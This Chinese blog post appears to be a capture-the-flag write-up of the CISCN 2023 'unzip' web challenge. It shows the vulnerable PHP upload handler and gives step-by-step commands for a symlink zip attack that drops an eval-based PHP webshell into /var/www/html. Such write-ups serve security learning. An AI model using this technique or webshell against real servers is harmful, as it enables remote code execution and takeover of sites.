---
title: ciscn2023 web部分
date: 2024-11-25 20:28:13
permalink: /pages/0e353f/
author: 
  name: Cola
  link: https://the0n3.top
---
学习下ciscn2023 web部分

<!-- more -->

## unzip

复现地址[ctfshow ciscn2023 unzip](https://ctf.show/challenges#Unzip-4002)

尝试上传一个图片，上传接口返回处理的源码

![1](https://the0n3.top/medias/ciscn2023/1.png)

```php
<?php
# 获取文件MIME类型
$finfo = finfo_open(FILEINFO_MIME_TYPE);
# 验证MEME类型，判断文件类型是否为zip
if (finfo_file($finfo, $_FILES["file"]["tmp_name"]) === 'application/zip'){
# 移动到tmp目录，解压在临时目录里上传的zip文件
    exec('cd /tmp && unzip -o ' . $_FILES["file"]["tmp_name"]);
};
```

分析一下：

- 上传zip文件，解压到`/tmp`目录
- `unzip -o`参数，如果zip文件中存在同名文件，则覆盖

通过上面两步操作，可以和linux`软链接`结合起来实现以下功能：

- 创建一个软链接文件`link`，指向网站根目录`/var/www/html`，压缩上传
- 创建同名文件夹`link`，在文件夹里创建木马文件，在使在解压后能够覆盖`link`文件即`/var/www/html`目录，可以实现把木马解压到`/var/www/html`目录getshell

在第一步创建`link`软连接文件压缩后，**记得删除，否则无法创建同名文件夹`link`**，是否一定要同名文件夹？是，否则前面创建的软连接没有意义

演示：

在本地创建`link`软连接文件，指向`/var/www/html`目录

```bash
# 创建软连接
ln -s /var/www/html link
# 压缩
zip --symlinks link.zip link
```

![2](https://the0n3.top/medias/ciscn2023/2.png)

删除`link`软连接文件，创建同名文件夹`link`，在文件夹里创建`shell.php`文件

```bash
# 删除软连接
rm link
# 创建文件夹，进入
mkdir link
cd link
# 写个🐎子
echo '<?php highlight_file(__FILE__);eval($_GET[1]);phpinfo();?>' > shell.php
# 移动到上一级，压缩
zip -r link1.zip ./link/*
```

![3](https://the0n3.top/medias/ciscn2023/3.png)

现在，可以先上传`link.zip`文件，实现解压后的`link`链接到`/var/www/html`目录，再上传`link1.zip`文件，把写好的木马直接解压到`/var/www/html`目录getshell，如果木马文件名为`upload.php`,`index.php`应该还可以覆盖原文件

访问木马路径

![4](https://the0n3.top/medias/ciscn2023/4.png)



参考、致谢：

- [【CISCN2023】unzip 详解](https://www.cnblogs.com/gxngxngxn/p/17439035.html)
- [一个有趣的任意文件读取](https://xz.aliyun.com/t/2589?time__1311=n4%2Bxni0%3DG%3Di%3D0QAeGNDQTcqYqeGTZxY5vd4x)
- [ctfshow](https://ctf.show)